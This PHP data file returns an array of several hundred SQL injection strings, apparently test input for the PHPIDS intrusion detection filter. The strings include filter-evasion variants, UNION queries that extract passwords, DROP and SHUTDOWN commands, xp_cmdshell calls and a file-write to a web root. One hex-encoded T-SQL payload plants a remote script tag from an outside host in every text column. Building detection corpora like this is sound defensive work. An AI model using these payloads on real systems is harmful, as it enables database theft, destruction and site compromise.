<?php
$exploits = array();

$exploits[] = '" OR 1=1#';
$exploits[] = '; DROP table Users --';
$exploits[] = '/**/S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE 1 = 1';
$exploits[] = 'admin\'--';
$exploits[] = 'SELECT /*!32302 1/0, */ 1 FROM tablename';
$exploits[] = '10;DROP members --';
$exploits[] = ' SELECT IF(1=1,\'true\',\'false\')';
$exploits[] = 'SELECT CHAR(0x66)';
$exploits[] = 'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)';
$exploits[] = 'EXEC(@stored_proc @param)';
$exploits[] = 'chr(11)||chr(12)||char(13)';
$exploits[] = 'MERGE INTO bonuses B USING (SELECT';
$exploits[] = '1 or name like \'%\'';
$exploits[] = '1 OR \'1\'!=0';
$exploits[] = '1 OR ASCII(2) = ASCII(2)';
$exploits[] = '1\' OR 1&"1';
$exploits[] = '1\' OR \'1\' XOR \'0';
$exploits[] = '1 OR+1=1';
$exploits[] = '1 OR+(1)=(1)';
$exploits[] = '1 OR \'1';
$exploits[] = 'aaa\' or (1)=(1) #!asd';
$exploits[] = 'aaa\' OR (1) IS NOT NULL #!asd';
$exploits[] = 'a\' or 1=\'1';
$exploits[] = 'asd\' union (select username,password from admins) where id=\'1';
$exploits[] = "1'; WAITFOR TIME '17:48:00 ' shutdown -- -a";
$exploits[] = "1'; anything: goto anything -- -a";
$exploits[] = "' =+ '";
$exploits[] = "asd' =- (-'asd') -- -a";
$exploits[] = 'aa"in+ ("aa") or -1 != "0';
$exploits[] = 'aa" =+ - "0 ';
$exploits[] = "aa' LIKE 0 -- -a";
$exploits[] = "aa' LIKE md5(1) or '1";
$exploits[] = "aa' REGEXP- md5(1) or '1";
$exploits[] = "aa' DIV@1 = 0 or '1";
$exploits[] = "aa' XOR- column != -'0";
$exploits[] = '============================="';
$exploits[] = 'union select password from users where 1';
$exploits[] = "str'=version()
UNION#
#
#
#
SELECT group_concat(table_name)#
##
/*!FROM*/ information_schema.tables WHERE '1";


 $exploits[] = 'asd"or-1="-1';
$exploits[] = 'asd"or!1="!1';
$exploits[] = 'asd"or!(1)="1';
$exploits[] = 'asd"or@1="@1';
$exploits[] = 'asd"or-1 XOR"0';
$exploits[] = 'asd" or ascii(1)="49';
$exploits[] = 'asd" or md5(1)^"1';
$exploits[] = 'asd" or table.column^"1';
$exploits[] = 'asd" or @@version^"0';
$exploits[] = 'asd" or @@global.hot_cache.key_buffer_size^"1';
$exploits[] = 'asd" or!(selec79t name from users limit 1)="1';
$exploits[] = '1"OR!"a';
$exploits[] = '1"OR!"0';
$exploits[] = '1"OR-"1';
$exploits[] = '1"OR@"1" IS NULL #1 ! (with unfiltered comment by tx ;)';
$exploits[] = '1"OR!(false) #1 !';
$exploits[] = '1"OR-(true) #a !';
$exploits[] = '1" INTO OUTFILE "C:/webserver/www/readme.php';
$exploits[] = "asd' or md5(5)^'1 ";
$exploits[] = "asd' or column^'-1 ";
$exploits[] = "asd' or true -- a";
$exploits[] = '\"asd" or 1="1';
$exploits[] = "a 1' or if(-1=-1,true,false)#!";
$exploits[] = "aa\\\\\"aaa' or '1";
$exploits[] = "' or id= 1 having 1 #1 !";
$exploits[] = "' or id= 2-1 having 1 #1 !";
$exploits[] = "aa'or null is null #(";
$exploits[] = "aa'or current_user!=' 1";
$exploits[] = "aa'or BINARY 1= '1";
$exploits[] = "aa'or LOCALTIME!='0";
$exploits[] = "aa'like-'aa";
$exploits[] = "aa'is\N|!'";
$exploits[] = "'is\N-!'";
$exploits[] = "asd'|column&&'1";
$exploits[] = "asd'|column!='";
$exploits[] = "aa'or column=column -- #aa";
$exploits[] = "aa'or column*column!='0";
$exploits[] = "aa'or column like column -- #a";
$exploits[] = "0'*column is \N - '1";
$exploits[] = "1'*column is \N or '1";
$exploits[] = "1'*@a is \N - '";
$exploits[] = "1'*@a is \N or '1";
$exploits[] = "1' -1 or+1= '+1 ";
$exploits[] = "1' -1 - column or '1 ";
$exploits[] = "1' -1 or '1";
$exploits[] = ' (1)or(1)=(1) ';
$exploits[] = "fo\"o'or'1";

$exploits[] = "' OR UserID IS NOT 2";
$exploits[] = "' OR UserID IS NOT NULL";
$exploits[] = "' OR UserID > 1";
$exploits[] = "' OR UserID RLIKE '.+' ";
$exploits[] = "'OR UserID <> 2";
$exploits[] = "1' union (select password from users) -- -a";
$exploits[] = "1' union (select'1','2',password from users) -- -a";
$exploits[] = "1' union all (select'1',password from users) -- -a";
$exploits[] = "aa'!='1";
$exploits[] = "aa'!=~'1";
$exploits[] = "aa'=('aa')#(";
$exploits[] = "aa'|+'1";
$exploits[] = "aa'|!'aa";
$exploits[] = "aa'^!'aa ";
$exploits[] = "abc' = !!'0";
$exploits[] = "abc' = !!!!'0";
$exploits[] = "abc' = !!!!!!!!!!!!!!'0";
$exploits[] = "abc' = !0 = !!'0";
$exploits[] = "abc' = !0 != !!!'0";
$exploits[] = "abc' = !+0 != !'0 ";
$exploits[] = "aa'=+'1";
$exploits[] = "';if 1=1 drop database test-- -a";
$exploits[] = "';if 1=1 drop table users-- -a";
$exploits[] = "';if 1=1 shutdown-- -a";
$exploits[] = "'; while 1=1 shutdown-- -a";
$exploits[] = "'; begin shutdown end-- -a ";
$exploits[] = "'+COALESCE('admin') and 1 = !1 div 1+'";
$exploits[] = "'+COALESCE('admin') and @@version = !1 div 1+'";
$exploits[] = "'+COALESCE('admin') and @@version = !@@version div @@version+'";
$exploits[] = "'+COALESCE('admin') and 1 =+1 = !true div @@version+'";
$exploits[] = "foo'div count(select`pass`from(users)where mid(pass,1,1)rlike lower(conv(10,pi()*pi(),pi()*pi())) )-'0";
$exploits[] = '1-#canvas
(SELECT 1*1 from(information_schema.tables) group by table_name having - left(hex(table_name),true) = -7)';
$exploits[] = 'str#\' UNION SELECT group_concat(table_name)
FROM`information_schema`.tables';


 $exploits[] = "aa'in (0)#(";
$exploits[] = "aa'!=ascii(1)#(";
$exploits[] = "' or SOUNDEX (1) != '0";
$exploits[] = "aa'RLIKE BINARY 0#(";
$exploits[] = "aa'or column!='1";
$exploits[] = "aa'or column DIV 0 =0 #";
$exploits[] = "aa'or column+(1)='1";
$exploits[] = "aa'or 0!='0";
$exploits[] = "aa'LIKE'0";
$exploits[] = "aa'or id ='\\'";
$exploits[] = "1';declare @# int;shutdown;set @# = '1";
$exploits[] = "1';declare @@ int;shutdown;set @@ = '1";
$exploits[] = "asd' or column&&'1";
$exploits[] = "asd' or column= !1 and+1='1";
$exploits[] = "aa'!=ascii(1) or-1=-'1";
$exploits[] = "a'IS NOT NULL or+1=+'1";
$exploits[] = "aa'in('aa') or-1!='0";
$exploits[] = "aa' or column=+!1 #1";
$exploits[] = "aa' SOUNDS like+'1";
$exploits[] = "aa' REGEXP+'0";
$exploits[] = "aa' like+'0";
$exploits[] = "-1'=-'+1";
$exploits[] = "'=+'";
$exploits[] = "aa' or stringcolumn= +!1 #1 ";
$exploits[] = "aa' or anycolumn ^ -'1";
$exploits[] = "aa' or intcolumn && '1";
$exploits[] = "asd' or column&&'1";
$exploits[] = "asd' or column= !1 and+1='1";
$exploits[] = "aa' or column=+!1 #1";
$exploits[] = "aa'IS NOT NULL or+1^+'0";
$exploits[] = "aa'IS NOT NULL or +1-1 xor'0";
$exploits[] = "aa'IS NOT NULL or+2-1-1-1 !='0";
$exploits[] = "aa'|1+1=(2)Or(1)='1";
$exploits[] = "aa'|3!='4";
$exploits[] = "aa'|ascii(1)+1!='1";
$exploits[] = "aa'|LOCALTIME*0!='1 ";
$exploits[] = "asd' |1 != (1)#aa";
$exploits[] = "' is 99999 = '";
$exploits[] = "' is 0.00000000000 = '";
$exploits[] = "1'*column-0-'0";
$exploits[] = "1'-@a or'1";
$exploits[] = "a'-@a=@a or'1";
$exploits[] = "aa' *@var or 1 SOUNDS LIKE (1)|'1";
$exploits[] = "aa' *@var or 1 RLIKE (1)|'1 ";
$exploits[] = "a' or~column like ~1|'1";
$exploits[] = "'<~'";
$exploits[] = "a'-1.and '1";

 $exploits[] = "aa'/1 DIV 1 or+1=+'1 ";
$exploits[] = "aa'&0+1='aa";
$exploits[] = "aa' like(0) + 1-- -a ";
$exploits[] = "aa'^0+0='0";
$exploits[] = "aa'^0+0+1-1=(0)-- -a";
$exploits[] = "aa'<3+1 or+1=+'1";
$exploits[] = "aa'%1+0='0";
$exploits[] = "'/1/1='";
$exploits[] = " aa'/1 or '1";
$exploits[] = " aa1' * @a or '1 '/1 regexp '0";
$exploits[] = " ' / 1 / 1 ='";
$exploits[] = " '/1='";
$exploits[] = " aa'&0+1 = 'aa";
$exploits[] = " aa'&+1='aa";
$exploits[] = " aa'&(1)='aa";
$exploits[] = " aa'^0+0 = '0";
$exploits[] = " aa'^0+0+1-1 = (0)-- -a";
$exploits[] = " aa'^+-3 or'1";
$exploits[] = " aa'^0!='1";
$exploits[] = " aa'^(0)='0";
$exploits[] = " aa' < (3) or '1";
$exploits[] = " aa' <<3 or'1";
$exploits[] = " aa'-+!1 or '1";
$exploits[] = " aa'-!1 like'0";
$exploits[] = " aa' % 1 or '1";
$exploits[] = " aa' / '1' < '3";
$exploits[] = " aa' / +1 < '3";
$exploits[] = " aa' - + ! 2 != + - '1";
$exploits[] = " aa' - + ! 1 or '1";
$exploits[] = " aa' / +1 like '0";
$exploits[] = " ' / + (1) / + (1) ='";
$exploits[] = " aa' & +(0)-(1)='aa";
$exploits[] = " aa' ^+ -(0) + -(0) = '0";
$exploits[] = " aa' ^ + - 3 or '1";
$exploits[] = " aa' ^ +0!='1";
$exploits[] = " aa' < +3 or '1";
$exploits[] = " aa' % +1 or '1";
$exploits[] = "aa'or column*0 like'0";
$exploits[] = "aa'or column*0='0";
$exploits[] = "aa'or current_date*0";
$exploits[] = "1'/column is not null - ' ";
$exploits[] = "1'*column is not \N - ' ";
$exploits[] = "1'^column is not null - ' ";
$exploits[] = "aa' is 0 or '1";
$exploits[] = "' or MATCH username AGAINST ('+admin -a' IN BOOLEAN MODE); -- -a";
$exploits[] = "' or MATCH username AGAINST ('a* -) -+ ' IN BOOLEAN MODE); -- -a";
$exploits[] = "1'*@a or '1";
$exploits[] = "1'*null or '1";
$exploits[] = "1'*UTC_TIME or '1";
$exploits[] = "1'*null is null - '";
$exploits[] = "1'*@a is null - '";
$exploits[] = "1'*@@version*-0%20=%20'0";
$exploits[] = "1'*current_date rlike'0";
$exploits[] = "aa'/current_date in (0) -- -a";
$exploits[] = "aa' / current_date regexp '0";
$exploits[] = "aa' / current_date != '1";
$exploits[] = "1' or current_date*-0 rlike'1";
$exploits[] = "0' / current_date XOR '1";
$exploits[] = "'or not false #aa";
$exploits[] = "1' * id - '0";
$exploits[] = "1' *id-'0";


$exploits[] = "asd'; shutdown; ";
$exploits[] = "asd'; select null,password,null from users; ";
$exploits[] = "aa aa'; DECLARE tablecursor CURSOR FOR select a.name as c,b.name as d,(null)from sysobjects a,syscolumns b where a.id=b.id and a.xtype = ( 'u' ) and current_user = current_user OPEN tablecursor ";
$exploits[] = "aa aa'; DECLARE tablecursor CURSOR FOR select a.name as c,b.name as d,(null)from sysobjects a,syscolumns b
where a.id=b.id and a.xtype = ( 'u' ) and current_user = current_user
OPEN tablecursor FETCH NEXT FROM tablecursor INTO @a,@b WHILE(@a != null)
@query = null+null+null+null+ ' UPDATE '+null+@a+null+ ' SET id=null,@b = @payload'
BEGIN EXEC sp_executesql @query
FETCH NEXT FROM tablecursor INTO @a,@b END
CLOSE tablecursor DEALLOCATE tablecursor;
and some text, to get pass the centrifuge; and some more text.";
$exploits[] = "@query = null+null+null+ ' UPDATE '+null+@a+ ' SET[ '+null+@b+ ' ] = @payload'";
$exploits[] = "asd' union distinct(select null,password,null from users)--a ";
$exploits[] = "asd' union distinct ( select null,password,(null)from user )-- a ";
$exploits[] = 'DECLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));EXEC(@S);';
$exploits[] = "asaa';SELECT[asd]FROM[asd]";
$exploits[] = "asd'; select [column] from users ";
$exploits[] = "0x31 union select @@version,username,password from users ";
$exploits[] = "1 order by if(1<2 ,uname,uid) ";
$exploits[] = "1 order by ifnull(null,userid) ";
$exploits[] = "2' between 1 and 3 or 0x61 like 'a";
$exploits[] = "4' MOD 2 like '0";
$exploits[] = "-1' /ID having 1< 1 and 1 like 1/'1 ";
$exploits[] = "2' / 0x62 or 0 like binary '0";
$exploits[] = "0' between 2-1 and 4-1 or 1 sounds like binary '1 ";
$exploits[] = "-1' union ((select (select user),(select password),1/1 from mysql.user)) order by '1 ";
$exploits[] = "-1' or substring(null/null,1/null,1) or '1";
$exploits[] = "1' and 1 = hex(null-1 or 1) or 1 /'null ";
$exploits[] = "AND CONNECTION_ID()=CONNECTION_ID()";
$exploits[] = "AND ISNULL(1/0)";
$exploits[] = "MID(@@hostname, 1, 1)";
$exploits[] = "CHARSET(CURRENT_USER())";
$exploits[] = "DATABASE() LIKE SCHEMA()";
$exploits[] = "COERCIBILITY(USER())";
$exploits[] = "1' and 0x1abc like 0x88 or '0";
$exploits[] = "'-1-0 union select (select `table_name` from `information_schema`.tables limit 1) and '1";
$exploits[] = "null''null' find_in_set(uname, 'lightos' ) and '1";
$exploits[] = '(case-1 when mid(load_file(0x61616161),12, 1/ 1)like 0x61 then 1 else 0 end) ';
$exploits[] = urldecode('%27sounds%20like%281%29%20union%19%28select%191,group_concat%28table_name%29,3%19from%19information_schema.%60tables%60%29%23%28');
$exploits[] = "0' '1' like (0) and 1 sounds like a or true#1";
$exploits[] = " 0'rlike(0)and 1 rlike (@a)or true - ' 0 ";
$exploits[] = "2a'-1^ ' 0' and (select mid(user,1 /1,1/ 1)from`mysql`.user limit 1) rlike 'r";
$exploits[] = 'password[$ne]=12';
$exploits[] = " A' sounds like(select case(1=1)when'1'then'A'end) and '1";
$exploits[] = "1' and 0x31='1 ";
$exploits[] = "1' and 0x05=(select 0- -mid(version()/- -1, 1,1) as 'a' from dual) and '1 ";
$exploits[] = "'AND 1.-1LIKE.1 EXEC xp_cmdshell 'dir ";
$exploits[] = "SELECT 1,2,0xEF`";
$exploits[] = "SELECT 1,2,3`abc``";
$exploits[] = "1'AND#
0#
UNION#
SELECT@a:=table_name FROM#
information_schema.tables LIMIT 1#";
$exploits[] = "1' and 0x43 = (select all mid(table_name, 1,1)as'a'from `information_schema`.tables limit 1) and '1
'AND 1.-1LIKE.1 INSERT INTO TMP_DB EXEC \"xp_cmdshell\"'dir";
$exploits[] = '1\' AND 0x35 = (SELECT @phpids:=MID(@@version FROM 1 FOR 1) FROM dual) and \'1 ';
$exploits[] = "null' or @:=(select all user'' from mysql . user limit 1) union#
#
select @'";
$exploits[] = '1\'and #
#aa
0 union#
#bb
select version()`';
$exploits[] = '1\'and #
#aa
0 union#
#bb
select (select `user` from#
#cc
mysql.user limit 1)\'';
$exploits[] = 'id=(1 )and(0)union%23xDxD%0%23xDxD%0%23xDxD%0%23xDxD%0Aselect 1,database%23xDxD%0%23xDxD%0%23xDxD%0%23xDxD%0A(),3';


return $exploits;